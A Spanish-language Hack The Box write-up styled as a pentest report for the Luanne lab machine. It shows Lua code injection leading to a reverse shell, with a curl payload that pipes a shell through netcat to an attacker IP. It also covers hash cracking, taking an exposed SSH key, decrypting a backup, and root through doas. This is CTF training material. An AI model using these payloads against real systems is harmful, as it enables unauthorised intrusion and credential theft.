---
title: "Informe Técnico: Luanne (Hack The Box) — Pentesting & Exploit Analysis"
published: true
description: "Informe técnico profesional de auditoria sobre la maquina Luanne de Hack The Box: vector de entrada, PoC de explotacion, escalada y mitigaciones OffSec."
tags: cybersecurity, ctf, hackthebox, pentesting
series: "Hack The Box Walkthroughs"
cover_image: "https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_01.png"
---

# Informe Técnico de Seguridad Ofensiva: Luanne

![Hack The Box](https://img.shields.io/badge/Platform-Hack%20The%20Box-green?style=for-the-badge&logo=hackthebox)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)
![OS](https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge)
![Standards](https://img.shields.io/badge/Methodology-OffSec%20%2F%20PTES-purple?style=for-the-badge)
![Auditor](https://img.shields.io/badge/Assessor-araizcorp%20Offensive%20Security-blue?style=for-the-badge)

**Evaluación de Seguridad Ofensiva y Penetration Testing** realizada sobre el entorno de laboratorio **Luanne** de **Hack The Box**, siguiendo los estándares de ejecución metodológica **OffSec PEN-200 (OSCP)** y **PTES (Penetration Testing Execution Standard)**.

---

## 📑 1. Resumen Ejecutivo (Executive Summary)

* **Objetivo de la Evaluación:** Identificar, documentar y explotar debilidades de seguridad en el host objetivo para evaluar el impacto sobre la confidencialidad, integridad y disponibilidad del sistema.
* **Calificación de Riesgo:** `CRÍTICO` (Acceso no autenticado que deriva en compromiso completo de la máquina y obtención de máximos privilegios administrativos).
* **Vector de Acceso Inicial:** Lua Code Injection (weather.lua)
* **Vector de Elevación de Privilegios:** doas + encrypted backup password
* **Estado Final:** Compromiso total del objetivo (`User Proof` y `Root/System Proof` obtenidas exitosamente).

### Ficha Técnica de la Evaluación

| Parámetro | Detalle Técnico |
| :--- | :--- |
| **Host Objetivo** | Luanne |
| **Plataforma** | Hack The Box |
| **Sistema Operativo** | Linux |
| **Nivel de Dificultad** | Easy |
| **CVE(s) Involucrados** | N/A |
| **Vector de Entrada** | Lua Code Injection (weather.lua) |
| **Mecanismo de Escalada** | doas + encrypted backup password |
| **Consultor / Auditor** | Pedro Araiz (`araizcorp`) |

---

## 🎯 2. Diagrama del Flujo de Compromiso (Attack Path)

```
[ Fase 1: Reconocimiento ]
         │
         ▼
[ Fase 2: Enumeración & Identificación de Vectores ]
         │─── Descubrimiento de servicios y análisis de superficie de ataque
         └─── Verificación de configuraciones erróneas y CVEs conocidos
         │
         ▼
[ Fase 3: Explotación Inicial (Foothold) ]
         │─── Ejecución del vector: Lua Code Injection (weather.lua)
         └─── Establecimiento de Reverse Shell / Acceso de usuario
         │
         ▼
[ Fase 4: Escalada de Privilegios Local ]
         │─── Auditoría interna: doas + encrypted backup password
         └─── Elevación a privilegios de superusuario (root / SYSTEM)
         │
         ▼
[ Fase 5: Evidencia & Banderas ]
         └─── Captura de User Flag y Root Flag
```

---

## 🔬 3. Procedimiento Técnico y Evidencias Paso a Paso

CVE(s): N/A
GTFOBins/Abusos (sudo/SUID): N/A
Initial Access Exploit (Ingreso): Lua Code Injection (weather.lua)

Privilege Escalation (Escalada): doas + encrypted backup password



| Campo | Detalle |
| --- | --- |
| Nombre | Luanne |
| OS | NetBSD |
| Dificultad | Easy |
| CVE | N/A |
| Acceso Inicial | Lua Code Injection (weather.lua) |
| Escalada | doas + password from encrypted backup |

---

## Reconocimiento

El escaneo revela 3 puertos TCP abiertos: 22 (SSH), 80 (Nginx/bozohttpd) y 9001 (Medusa/Supervisor).

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_01.png)

## Enumeracion

En el puerto 9001 corre **Supervisor Process Manager**, accesible con credenciales por defecto `user:123`. Desde el panel se observan dos instancias de bozohttpd: produccion (puerto 3000) y desarrollo (puerto 3001).

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_02.png)

Las credenciales por defecto de Supervisor son `user:123`.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_03.png)

En el puerto 80, la ruta `/weather` ejecuta un script Lua llamado **weather.lua** a traves del proceso httpd.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_04.png)

## Explotacion

Fuzzing revela que `/weather/forecast` devuelve HTTP 200. El parametro **city** es vulnerable a **Lua Code Injection**.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_05.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_06.png)

Inyectando `os.execute()` en el parametro city, se obtiene ejecucion de comandos y una reverse shell como `_httpd`.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_07.png)

## Movimiento Lateral

En `.htpasswd` se encuentra el hash de **webapi_user**, que se crackea con john obteniendo: **iamthebest**.

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_08.png)

![Captura de pantalla 2025-08-12 185009.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_09.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_10.png)

El flag `-u` de bozohttpd expone los home directories de los usuarios. Accediendo al servidor de desarrollo (puerto 3001) con las credenciales de webapi_user, se accede a `/~r.michaels/` y se obtiene su clave privada SSH.

### User Flag (r.michaels)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_11.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_12.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_13.png)

## Escalada de Privilegios

En el home de r.michaels hay un backup encriptado. Se descifra con **netpgp** (herramienta de NetBSD equivalente a gpg).

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_14.png)

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_15.png)

Dentro del backup, el `.htpasswd` contiene un hash diferente que se crackea obteniendo: **littlebear**.

```jsx
cd /tmp


mkdir -m 700 /tmp/.gnupg
cp -a /home/r.michaels/.gnupg/* /tmp/.gnupg/
chmod 600 /tmp/.gnupg/*

cp /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc /tmp
cd /tmp
netpgp --decrypt --output=devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc
tar xvzf devel_backup-2020-09-16.tar.gz
```

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_16.png)

En NetBSD no hay `sudo`, se usa **doas**. La configuracion permite a r.michaels ejecutar comandos como root. Usando `doas -u root sh` con la contrasena `littlebear`, se obtiene shell como root.

### Root Flag

![image.png](https://raw.githubusercontent.com/araizcorp/tryhackme-writeups/main/hackthebox/luanne/images/step_17.png)

> 
> 
> 
> ## 🛠️ HTB – Luanne (writeup con comandos explicados)
> 
> ---
> 
> ### **1️⃣ Enumeración inicial**
> 
> Escaneo de puertos:
> 
> ```bash
> bash
> CopiarEditar
> ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.218 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
> nmap -p$ports -sC -sV 10.10.10.218
> 
> ```
> 
> - Encuentra:
>     - **22/tcp** → SSH
>     - **80/tcp** → Nginx
>     - **9001/tcp** → Medusa Supervisor Process Manager
> 
> ---
> 
> ### **2️⃣ Acceso a Supervisor**
> 
> Buscar credenciales por defecto en Google → `user:123`.
> 
> ```bash
> bash
> CopiarEditar
> # Abrir navegador o curl
> curl -u user:123 http://10.10.10.218:9001
> 
> ```
> 
> - Accede al panel de Supervisor y vemos procesos en ejecución.
> - Dos instancias `bozohttpd`:
>     - `3000` producción → `/var/www`
>     - `3001` desarrollo → `/home/r.michaels/devel/www`
> 
> ---
> 
> ### **3️⃣ Descubrimiento de la API**
> 
> Fuzzing de rutas en `/weather`:
> 
> ```bash
> bash
> CopiarEditar
> ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather/FUZZ
> 
> ```
> 
> - Encuentra `/forecast`.
>     
>     Probar endpoint:
>     
> 
> ```bash
> bash
> CopiarEditar
> curl "http://10.10.10.218/weather/forecast?city=list"
> curl "http://10.10.10.218/weather/forecast?city=London"
> 
> ```
> 
> ---
> 
> ### **4️⃣ Exploit – Lua Code Injection**
> 
> Probar ejecución de comandos:
> 
> ```bash
> bash
> CopiarEditar
> curl "http://10.10.10.218/weather/forecast?city=')+os.execute('id')+--"
> 
> ```
> 
> Si funciona, obtenemos reverse shell:
> 
> ```bash
> bash
> CopiarEditar
> # En atacante:
> nc -lvp 4444
> 
> # En víctima vía inyección:
> curl "http://10.10.10.218/weather/forecast?city=')+os.execute('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.3+4444+>/tmp/f')+--"
> 
> ```
> 
> - Acceso como `_httpd`.
> 
> ---
> 
> ### **5️⃣ Movimiento lateral**
> 
> Encontrar credenciales en `.htpasswd`:
> 
> ```bash
> bash
> CopiarEditar
> cat /var/www/.htpasswd
> 
> ```
> 
> Crackear hash:
> 
> ```bash
> bash
> CopiarEditar
> echo "webapi_user:\$1\$vVoNCsOl\$lMtBS6GL2upDbR4Owhzyc0" > hash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash
> # Resultado: iamthebest
> 
> ```
> 
> ---
> 
> ### **6️⃣ Acceso a servidor de desarrollo**
> 
> Probar login:
> 
> ```bash
> bash
> CopiarEditar
> curl --user webapi_user:iamthebest localhost:3001
> 
> ```
> 
> - Vulnerabilidad Lua parcheada.
> - Revisar config → `u` en bozohttpd permite `/~usuario/`.
> 
> Listar home público:
> 
> ```bash
> bash
> CopiarEditar
> curl --user webapi_user:iamthebest localhost:3001/~r.michaels/
> curl --user webapi_user:iamthebest localhost:3001/~r.michaels/id_rsa
> 
> ```
> 
> Guardar clave y conectar:
> 
> ```bash
> bash
> CopiarEditar
> chmod 600 id_rsa
> ssh -i id_rsa r.michaels@10.10.10.218
> 
> ```
> 
> ---
> 
> ### **7️⃣ Desencriptar backup**
> 
> Listar:
> 
> ```bash
> bash
> CopiarEditar
> ls /home/r.michaels/backups
> # devel_backup-2020-09-16.tar.gz.enc
> 
> ```
> 
> Ver claves:
> 
> ```bash
> bash
> CopiarEditar
> ls /home/r.michaels/.gnupg
> # pubring.gpg secring.gpg
> 
> ```
> 
> Usar `netpgp`:
> 
> ```bash
> bash
> CopiarEditar
> cp /home/r.michaels/backups/devel_backup-2020-09-16.tar.gz.enc /tmp
> NETPGP_HOME=/home/r.michaels/.gnupg \
> netpgp --decrypt --output=/tmp/devel_backup-2020-09-16.tar.gz /tmp/devel_backup-2020-09-16.tar.gz.enc
> tar -xzvf /tmp/devel_backup-2020-09-16.tar.gz -C /tmp
> 
> ```
> 
> ---
> 
> ### **8️⃣ Encontrar nueva contraseña**
> 
> En backup:
> 
> ```bash
> bash
> CopiarEditar
> cat /tmp/devel-2020-09-16/www/.htpasswd
> # webapi_user:$1$6xc7I/LW$WuSQCS6n3yXsjPMSmwHDu.
> 
> ```
> 
> Crackear:
> 
> ```bash
> bash
> CopiarEditar
> echo "webapi_user:\$1\$6xc7I/LW\$WuSQCS6n3yXsjPMSmwHDu." > hash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash
> # Resultado: littlebear
> 
> ```
> 
> ---
> 
> ### **9️⃣ Escalada con doas**
> 
> Comprobar config:
> 
> ```bash
> bash
> CopiarEditar
> cat /etc/doas.conf
> # permit r.michaels as root
> 
> ```
> 
> Elevar privilegios:
> 
> ```bash
> bash
> CopiarEditar
> doas -u root sh
> # Pass: littlebear
> 
> ```
> 
> Ya como root:
> 
> ```bash
> bash
> CopiarEditar
> cat /root/root.txt
> 
> ```
> 
> ---
> 
> ### 📌 Claves del proceso
> 
> - **Supervisor credenciales por defecto** → visibilidad de procesos internos.
> - **bozohttpd + Lua vulnerable** → RCE.
> - **Flag `u`** en bozohttpd → exposición de home público y `id_rsa`.
> - **netpgp** usado en lugar de gpg para descifrar backup.
> - **doas** en NetBSD como alternativa a sudo → root.

---

## 🛡️ 4. Plan de Remediación y Recomendaciones de Hardening

### Acciones Tácticas Inmediatas
1. **Aplicación de Parches y Actualización:** Actualizar todos los servicios obsoletos y aplicar los parches correspondientes a las vulnerabilidades documentadas (N/A).
2. **Revisión de Permisos Críticos:** Eliminar permisos SUID/sudo innecesarios y auditar listas de control de acceso (ACLs) en directorios y archivos sensibles.
3. **Cierre de Superficie de Exposición:** Configurar firewalls a nivel de host para denegar puertos de administración o de depuración que no deban estar expuestos públicamente.

### Acciones Estratégicas y de Arquitectura
1. **Principio de Mínimo Privilegio (PoLP):** Configurar servicios y aplicaciones para que se ejecuten bajo cuentas de servicio con privilegios limitados sin acceso a shells interactivas.
2. **Segmentación de Red:** Aislar componentes críticos y servidores de aplicaciones en VLANs dedicadas con inspección de tráfico Este-Oeste.
3. **Monitorización Continua y EDR:** Implementar reglas de detección basadas en comportamiento para identificar ejecuciones anómalas de comandos, spawning de shells y tráfico de red no autorizado.

---

## 📊 5. Mapeo con Matriz MITRE ATT&CK

| Táctica | ID de Técnica | Nombre de Técnica | Aplicación en el Ejercicio |
| :--- | :--- | :--- | :--- |
| **Reconnaissance** | `T1595.002` | Vulnerability Scanning | Detección automatizada y manual de servicios mediante escaneo de puertos |
| **Initial Access** | `T1190` | Exploit Public-Facing Application | Explotación de vulnerabilidad en servicio de red expuesto (Lua Code Injection (weather.lua)) |
| **Execution** | `T1059` | Command and Scripting Interpreter | Spawning de reverse shell interactiva para control del endpoint |
| **Privilege Escalation** | `T1068 / T1548` | Abuse Elevation Mechanism / Exploitation | Elevación de privilegios hacia superusuario (doas + encrypted backup password) |

---

© 2026 **araizcorp** — Documentación técnica desarrollada para preparación y consultoría de certificaciones **OffSec** (OSCP, OSEP, OSWE).
